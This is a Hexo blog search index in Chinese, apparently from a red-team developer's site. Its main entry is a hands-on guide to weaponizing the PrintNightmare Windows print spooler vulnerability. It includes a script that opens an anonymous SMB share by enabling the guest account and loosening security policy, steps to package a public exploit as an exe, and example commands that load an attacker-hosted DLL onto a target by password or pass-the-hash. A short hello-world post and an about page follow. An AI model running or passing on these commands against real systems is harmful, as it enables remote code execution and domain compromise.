<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>PrintNightmare 实战利用Tips</title>
    <link href="/PrintNightmare/"/>
    <url>/PrintNightmare/</url>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a><strong>概述</strong></h1><p><strong>CVE-2021-1675 &#x2F; CVE-2021-34527 这两个洞本质上就是一个洞，只是因为修复的问题分配了两个编号。具体的漏洞分析就不赘述了，很早就有人发过，没必要炒冷饭，这里只总结下实际使用时可能出现的问题，以及很多poc中不会提到的细节</strong></p><h2 id="复现攻击环境"><a href="#复现攻击环境" class="headerlink" title="复现攻击环境"></a>复现攻击环境</h2><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><h4 id="1-域相关"><a href="#1-域相关" class="headerlink" title="1.域相关"></a>1.域相关</h4><p>目标机器为域内Windows Server机器时，攻击机必须为同一域内的机器；目标机器为非域环境Windows Server机器时，攻击机器为目标机器可以访问到的另一机器即可</p><blockquote><p>加入域后的Windows系统访问外部资源会携带已登录的域用户凭证，所以未加入域且未提前指定凭据的的SMB就无法访问。因此攻击域内机器有此限制</p></blockquote><h4 id="2-SMBv1"><a href="#2-SMBv1" class="headerlink" title="2.SMBv1"></a>2.SMBv1</h4><p>攻击机器为Windows Server 2019及更高版本时，需要执行 <code>Enable-WindowsOptionalFeature -Online -FeatureName smb1protocol</code>并重启去开启SMBv1，否则有可能出现rpc_s_access_denied的问题，攻击机器为2016及更低版本的系统时，可以直接使用 <code>Set-SmbServerConfiguration -EnableSMB1Protocol $true</code>开启SMBv1的支持</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="1-准备payload"><a href="#1-准备payload" class="headerlink" title="1.准备payload"></a>1.准备payload</h3><p>在攻击机器创建C:\share文件夹，并将dll放入其中（此路径可根据需求修改，修改后下一步脚本自行对应修改）</p><h3 id="2-开启SMB匿名共享"><a href="#2-开启SMB匿名共享" class="headerlink" title="2.开启SMB匿名共享"></a>2.开启SMB匿名共享</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><br><span class="hljs-comment">#修改路径权限，使所有人可读</span><br>icacls C:\share\ /T /grant Anonymous` logon:F<br>icacls C:\share\ /T /grant Everyone:F<br><span class="hljs-comment">#创建名称为share路径为C:\share的SMB共享</span><br><span class="hljs-built_in">New-SmbShare</span> <span class="hljs-literal">-Path</span> C:\share <span class="hljs-literal">-Name</span> share <span class="hljs-literal">-FullAccess</span> <span class="hljs-string">&#x27;ANONYMOUS LOGON&#x27;</span>,<span class="hljs-string">&#x27;Everyone&#x27;</span><br><span class="hljs-comment">#启用guest用户</span><br>net user guest /active:yes<br><span class="hljs-comment">#覆盖已有的NullSessionPipes配置</span><br>REG ADD <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Services\LanManServer\Parameters&quot;</span> /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f<br><span class="hljs-comment">#设置可以匿名访问共享</span><br>REG ADD <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Services\LanManServer\Parameters&quot;</span> /v NullSessionShares /t REG_MULTI_SZ /d share /f<br><span class="hljs-comment">#设置Everyone权限包含匿名登录用户</span><br>REG ADD <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v EveryoneIncludesAnonymous /t REG_DWORD /d <span class="hljs-number">1</span> /f<br><span class="hljs-comment">#设置任何用户都可以通过网络获取本机的信息</span><br>REG ADD <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v RestrictAnonymous /t REG_DWORD /d <span class="hljs-number">0</span> /f<br><span class="hljs-comment">#提取本地安全组策略</span><br>secedit /export /cfg gp.inf /quiet<br><span class="hljs-comment">#修改组策略中的指定权限</span><br>(<span class="hljs-built_in">Get-Content</span> gp.inf) <span class="hljs-operator">-replace</span> <span class="hljs-string">&quot;SeDenyNetworkLogonRight = Guest&quot;</span>,<span class="hljs-string">&quot;SeDenyNetworkLogonRight = &quot;</span> | <span class="hljs-built_in">Set-Content</span> <span class="hljs-string">&quot;gp.inf&quot;</span><br><span class="hljs-comment">#导入本地安全组策略</span><br>secedit /configure /db gp.sdb /cfg gp.inf /quiet<br><span class="hljs-comment">#更新本地安全组策略</span><br>CMD.EXE /C <span class="hljs-string">&quot;gpupdate/force&quot;</span><br><span class="hljs-comment">#清理文件</span><br>CMD.EXE /C <span class="hljs-string">&quot;del gp.inf&quot;</span><br>CMD.EXE /C <span class="hljs-string">&quot;del gp.sdb&quot;</span><br></code></pre></td></tr></table></figure><p>注：此脚本修改自<a href="https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer">Invoke-BuildAnonymousSMBServer</a></p><h3 id="3-准备exp"><a href="#3-准备exp" class="headerlink" title="3.准备exp"></a>3.准备exp</h3><h4 id="选择exp"><a href="#选择exp" class="headerlink" title="选择exp"></a>选择exp</h4><p>推荐exp为<a href="https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py">CVE-2021-1675.py</a>，主要优势在于可以使用hash进行攻击，现在越来越难搞到密码了，hash的场景更多</p><p>因为大部分目标环境不会有python环境，所以最好打包为exe使用</p><h4 id="打包exe"><a href="#打包exe" class="headerlink" title="打包exe"></a>打包exe</h4><p>打包使用Windows 7机器，安装<a href="https://www.python.org/ftp/python/3.8.10/python-3.8.10-amd64.exe">Python3.8</a>，<a href="https://github.com/git-for-windows/git/releases/download/v2.38.1.windows.1/Git-2.38.1-64-bit.exe">Git</a>，之后执行以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/cube0x0/impacket<br><span class="hljs-built_in">cd</span> impacket<br>certutil -urlcache -<span class="hljs-built_in">split</span> -f https://raw.githubusercontent.com/cube0x0/CVE-2021-1675/main/CVE-2021-1675.py CVE-2021-1675.py<br>pip3 install six pycryptodomex pyasn1 pyinstaller<br>pyinstaller --clean --onefile CVE-2021-1675.py<br></code></pre></td></tr></table></figure><p>生成的文件在<code>\impacket\dist\CVE-2021-1675.exe</code></p><h3 id="4-执行"><a href="#4-执行" class="headerlink" title="4.执行"></a>4.执行</h3><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">CVE-2021-1675.exe hackit.local/domain_user:Pass123@192.168.1.10 <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span><br><br>CVE-2021-1675.exe hackit.local/domain_user:Pass123@192.168.1.10 <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span> <span class="hljs-string">&quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL&quot;</span><br><br>CVE-2021-1675.exe hackit.local/domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span><br><br>CVE-2021-1675.exe hackit.local/domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span> <span class="hljs-string">&quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL&quot;</span><br><br>CVE-2021-1675.exe domain_user:Pass123@192.168.1.10 <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span><br><br>CVE-2021-1675.exe domain_user:Pass123@192.168.1.10 <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span> <span class="hljs-string">&quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL&quot;</span><br><br>CVE-2021-1675.exe domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span><br><br>CVE-2021-1675.exe domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span> <span class="hljs-string">&quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>PrintNightmare</tag>
      
      <tag>CVE-2021-1675</tag>
      
      <tag>CVE-2021-34527</tag>
      
      <tag>武器化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World Again</title>
    <link href="/hello-world/"/>
    <url>/hello-world/</url>
    
    <content type="html"><![CDATA[<p>历时半个多月，删站的我又决定把博客搭起来了，这次从用了五年的Wordpress换成了Hexo，自动部署的纯静态博客似乎也是不错的</p><p>不过之前的文章没有保存了，很多都是早年写的东西，现在看来已经没有意义了</p><p>后面会尽量恢复记笔记的习惯，也就顺手更一些文章吧，希望我的文章可以帮到你</p>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title>about</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[<p>这里是<em>簞純</em>，一个<del>单纯的</del>日常生产bug再debug的菜鸡红队安全开发，目前主要做Windows下的二进制方向开发</p><p><strong>ID</strong>：<em>簞純 &#x2F; qwqdanchun</em></p><p><strong>Tag</strong>：伪技术宅，干饭人，老二次元，佛系，咕咕咕，夜猫子</p><p><strong>QQ聊天群</strong>：<a href="https://jq.qq.com/?_wv=1027&k=Ok58ZNSd">814084837</a></p>]]></content>
    
  </entry>
  
  
  
</search>
